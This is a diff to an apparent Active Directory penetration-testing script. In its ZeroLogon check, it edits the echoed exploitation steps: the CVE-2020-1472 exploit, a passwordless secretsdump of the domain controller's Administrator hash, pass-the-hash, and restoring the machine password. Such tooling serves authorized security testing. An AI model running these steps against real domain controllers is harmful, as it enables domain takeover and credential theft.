@@ -1150,9 +1150,9 @@ zerologon_check () {
     if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
         echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
         echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
-        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\\$@$dc_ip -no-pass -just-dc-user Administrator"
-        echo -e "secretsdump.py -hashes :<HASH_admin> $dc_domain/Administrator@$dc_ip"
-        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HEXPASS>"
+        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator"
+        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip"
+        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>"
     fi
     echo -e ""
 }
